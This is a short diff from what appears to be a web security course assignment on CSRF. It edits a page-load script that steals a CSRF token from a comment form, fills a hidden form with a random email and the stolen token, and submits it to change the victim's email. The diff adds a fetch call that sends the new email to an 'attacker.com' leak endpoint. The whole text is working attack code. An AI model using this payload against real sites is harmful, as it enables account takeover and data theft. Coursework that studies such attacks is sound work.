@@ -17,12 +17,20 @@ Web Security Assignment on CSRF
  
   window.onload = function() { 
 
+    
+
     let stolen_csrf = [...document.getElementsByTagName("form")].filter((f) => {
     return f.action.includes("/comment");
   })[0].children[0].value;
  
-    document.getElementById("my_mail").value = rndMail();
+    let new_mail = rndMail()
+    document.getElementById("my_mail").value = new_mail
     document.getElementById("my_csrf").value = stolen_csrf;
+
+    //attackers logging
+    let url = "http://www.attacker.com:5000/leak?newmail=" + new_mail; 
+    fetch(url, {method: "GET", mode: "no-cors"});
+
     document.getElementById("fake_form").submit(); 
 }
 </script>
